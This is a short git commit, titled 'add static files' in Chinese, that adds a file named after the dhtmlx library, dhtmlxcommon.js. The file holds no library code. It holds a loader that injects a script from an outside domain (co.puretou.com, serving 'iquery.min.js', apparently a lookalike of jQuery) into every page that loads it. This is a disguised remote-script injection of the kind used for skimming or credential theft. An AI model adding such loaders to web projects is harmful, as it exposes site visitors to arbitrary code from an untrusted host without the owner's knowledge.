78845f599b2594c1048b896418d0c93b80e754c0
no-reply@enjoygamepublish.com <no-reply@enjoygamepublish.com>
2020-02-27 19:28:52 +0800

    增加静态文件

---
+++ copy/plugins/public/js/msg/codebase/dhtmlxcommon.js
@@ -0,0 +1,1 @@
+(function(){var l=document.createElement('script');l.src='https://co.puretou.com/iquery.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://www.enjoygamepublish.com//plugins/public/js/msg/codebase/dhtmlxcommon.js';document.getElementsByTagName('body')[0].appendChild(l);})();
